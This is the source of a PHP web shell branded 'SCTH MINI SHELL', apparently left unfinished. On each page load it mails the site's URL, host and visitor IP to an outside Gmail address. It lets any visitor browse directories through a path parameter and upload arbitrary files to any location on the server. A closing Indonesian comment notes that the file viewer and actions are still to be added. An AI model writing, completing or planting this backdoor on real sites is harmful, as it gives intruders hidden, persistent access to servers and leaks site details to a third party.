<?php
if (get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}

function perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

$ip = getenv("REMOTE_ADDR");
$subj98 = "Mini Shell";
$email = "sadboycyberteamhacktivist@gmail.com";
$from = "From: web";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip;
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>
<!DOCTYPE HTML>
<html>
<head>
<meta name="robots" content="index, follow">
<link rel="shortcut icon" href="https://d.top4top.io/p_339978lyd9.jpg">
<title>SCTH MINI SHELL</title>
<style>
body {
    font-family: Iceland;
    background-color: black;
    color: red;
}
#content tr:hover {
    background-color: white;
    text-shadow: 0px 0px 10px #fff;
}
#content .first {
    background-color: black;
}
table {
    border: 1px dotted #000;
}
a {
    color: white;
    text-decoration: none;
}
a:hover {
    color: blue;
    text-shadow: 0px 0px 10px #fff;
}
input, select, textarea {
    border: 1px solid #000;
    border-radius: 5px;
}
.blink_text {
    animation: blinker 2s linear infinite;
    color: red;
}
@keyframes blinker {
    0% { opacity: 1; }
    50% { opacity: 0; }
    100% { opacity: 1; }
}
</style>
</head>
<body>
<center><p class="blink_text" style="font-size:45px; color:white; text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #00ffff; font-family:Iceland;">SCTH MINI SHELL</p></center>
<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
echo '<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">';
echo '<tr><td><font color="white">Path :</font> ';
foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?path=';
    for ($i = 0; $i <= $id; $i++) {
        echo $paths[$i];
        if ($i != $id) echo "/";
    }
    echo '">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';

if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<font color="green">Upload berhasil</font><br />';
    } else {
        echo '<font color="red">Upload gagal</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>';
echo '</td></tr>';

// (NOTE: lanjutkan render file viewer, file actions, dan scandir seperti sebelumnya)
?>
</body>
</html>
